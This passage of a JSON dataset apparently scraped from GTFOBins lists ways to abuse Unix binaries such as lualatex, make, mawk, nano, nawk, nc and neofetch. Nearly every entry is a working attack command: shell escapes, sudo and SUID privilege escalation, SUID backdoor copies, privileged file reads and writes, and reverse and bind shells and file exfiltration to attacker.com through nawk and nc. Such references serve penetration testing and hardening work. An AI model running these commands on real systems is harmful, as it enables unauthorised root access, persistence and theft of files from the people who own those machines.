        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which lua) .\n\n./lua -e 'os.execute(\"/bin/sh\")'"
      }
    ]
  },
  {
    "id": 155,
    "bin": "lualatex",
    "url": "/gtfobins/lualatex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nlualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which lualatex) .\n\n./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
      }
    ]
  },
  {
    "id": 156,
    "bin": "luatex",
    "url": "/gtfobins/luatex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nluatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which luatex) .\n\n./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
      }
    ]
  },
  {
    "id": 157,
    "bin": "lwp-download",
    "url": "/gtfobins/lwp-download/",
    "funcs": [
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nlwp-download file://$TF $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file path must be absolute.\nLFILE=file_to_read\nTF=$(mktemp)\nlwp-download \"file://$LFILE\" $TF\ncat $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE"
      }
    ]
  },
  {
    "id": 158,
    "bin": "lwp-request",
    "url": "/gtfobins/lwp-request/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nlwp-request \"file://$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo lwp-request \"file://$LFILE\""
      }
    ]
  },
  {
    "id": 159,
    "bin": "mail",
    "url": "/gtfobins/mail/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nGNU version only.\nmail --exec='!/bin/sh'\n\n\nThis creates a valid Mbox file which may be required by the binary.\nTF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nGNU version only.\nsudo mail --exec='!/bin/sh'"
      }
    ]
  },
  {
    "id": 160,
    "bin": "make",
    "url": "/gtfobins/make/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nCOMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nRequires a newer GNU make version.\nLFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" .\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which make) .\n\nCOMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nCOMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\""
      }
    ]
  },
  {
    "id": 161,
    "bin": "man",
    "url": "/gtfobins/man/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nman man\n!/bin/sh\n\n\nThis only works for GNU man and requires GNU troff (groff to be installed).\nman '-H/bin/sh #' man\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nman file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo man man\n!/bin/sh"
      }
    ]
  },
  {
    "id": 162,
    "bin": "mawk",
    "url": "/gtfobins/mawk/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nmawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which mawk) .\n\nLFILE=file_to_read\n./mawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo mawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which mawk) .\n\n./mawk 'BEGIN {system(\"/bin/sh\")}'"
      }
    ]
  },
  {
    "id": 163,
    "bin": "more",
    "url": "/gtfobins/more/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTERM= more /etc/profile\n!/bin/sh\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nmore file_to_read\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which more) .\n\n./more file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTERM= sudo more /etc/profile\n!/bin/sh"
      }
    ]
  },
  {
    "id": 164,
    "bin": "mosquitto",
    "url": "/gtfobins/mosquitto/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmosquitto -c \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which mosquitto) .\n\nLFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo mosquitto -c \"$LFILE\""
      }
    ]
  },
  {
    "id": 165,
    "bin": "mount",
    "url": "/gtfobins/mount/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nExploit the fact that mount can be executed via sudo to replace the mount binary with a shell.\nsudo mount -o bind /bin/sh /bin/mount\nsudo mount"
      }
    ]
  },
  {
    "id": 166,
    "bin": "msgattrib",
    "url": "/gtfobins/msgattrib/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmsgattrib -P $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which msgattrib) .\n\nLFILE=file_to_read\n./msgattrib -P $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo msgattrib -P $LFILE"
      }
    ]
  },
  {
    "id": 167,
    "bin": "msgcat",
    "url": "/gtfobins/msgcat/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmsgcat -P $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which msgcat) .\n\nLFILE=file_to_read\n./msgcat -P $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo msgcat -P $LFILE"
      }
    ]
  },
  {
    "id": 168,
    "bin": "msgconv",
    "url": "/gtfobins/msgconv/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmsgconv -P $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which msgconv) .\n\nLFILE=file_to_read\n./msgconv -P $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo msgconv -P $LFILE"
      }
    ]
  },
  {
    "id": 169,
    "bin": "msgfilter",
    "url": "/gtfobins/msgfilter/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nAny text file will do as the input (use -i). kill is needed to spawn the shell only once.\necho x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is parsed and displayed as a Java .properties file, so this may not be suitable to read arbitrary binary data. /bin/cat can be replaced with any other filter program.\nLFILE=file_to_read\nmsgfilter -P -i \"LFILE\" /bin/cat\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nAny text file will do as the input (use -i). kill is needed to spawn the shell only once.\nsudo install -m =xs $(which msgfilter) .\n\necho x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nAny text file will do as the input (use -i). kill is needed to spawn the shell only once.\necho x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'"
      }
    ]
  },
  {
    "id": 170,
    "bin": "msgmerge",
    "url": "/gtfobins/msgmerge/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which msgmerge) .\n\nLFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null"
      }
    ]
  },
  {
    "id": 171,
    "bin": "msguniq",
    "url": "/gtfobins/msguniq/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmsguniq -P $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which msguniq) .\n\nLFILE=file_to_read\n./msguniq -P $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo msguniq -P $LFILE"
      }
    ]
  },
  {
    "id": 172,
    "bin": "mtr",
    "url": "/gtfobins/mtr/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nmtr --raw -F \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\""
      }
    ]
  },
  {
    "id": 173,
    "bin": "multitime",
    "url": "/gtfobins/multitime/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nmultitime /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which multitime) .\n\n./multitime /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo multitime /bin/sh"
      }
    ]
  },
  {
    "id": 174,
    "bin": "mv",
    "url": "/gtfobins/mv/",
    "funcs": [
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which mv) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE"
      }
    ]
  },
  {
    "id": 175,
    "bin": "mysql",
    "url": "/gtfobins/mysql/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nmysql -e '\\! /bin/sh'\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nA MySQL server must accept connections in order for this to work.\nThe following loads the /path/to/lib.so shared object.\nmysql --default-auth ../../../../../path/to/lib\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo mysql -e '\\! /bin/sh'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which mysql) .\n\n./mysql -e '\\! /bin/sh'"
      }
    ]
  },
  {
    "id": 176,
    "bin": "nano",
    "url": "/gtfobins/nano/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnano\n^R^X\nreset; sh 1>&0 2>&0\n\n\nThe SPELL environment variable can be used in place of the -s option if the command line cannot be changed.\nnano -s /bin/sh\n/bin/sh\n^T\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nnano file_to_write\nDATA\n^O\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nnano file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo nano\n^R^X\nreset; sh 1>&0 2>&0\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe SPELL environment variable can be used in place of the -s option if the command line cannot be changed.\nsudo install -m =xs $(which nano) .\n\n./nano -s /bin/sh\n/bin/sh\n^T"
      }
    ]
  },
  {
    "id": 177,
    "bin": "nasm",
    "url": "/gtfobins/nasm/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nnasm -@ $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nasm) .\n\nLFILE=file_to_read\n./nasm -@ $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo nasm -@ $LFILE"
      }
    ]
  },
  {
    "id": 178,
    "bin": "nawk",
    "url": "/gtfobins/nawk/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nRHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell.\nLPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nnawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nawk) .\n\nLFILE=file_to_read\n./nawk '//' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo nawk 'BEGIN {system(\"/bin/sh\")}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nawk) .\n\n./nawk 'BEGIN {system(\"/bin/sh\")}'"
      }
    ]
  },
  {
    "id": 179,
    "bin": "nc",
    "url": "/gtfobins/nc/",
    "funcs": [
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.\nRHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT\n\n"
      },
      {
        "func": "Bind shell",
        "man": "It can bind a shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This only works with netcat traditional.\nLPORT=12345\nnc -l -p $LPORT -e /bin/sh\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < \"$LFILE\"\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file.\nLPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.\nRHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.\nsudo install -m =xs $(which nc) .\n\nRHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT"
      }
    ]
  },
  {
    "id": 180,
    "bin": "neofetch",
    "url": "/gtfobins/neofetch/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.\nLFILE=file_to_read\nneofetch --ascii $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF"
      }
    ]
  },
  {
    "id": 181,
    "bin": "nft",
    "url": "/gtfobins/nft/",
    "funcs": [
      {
        "func": "File read",
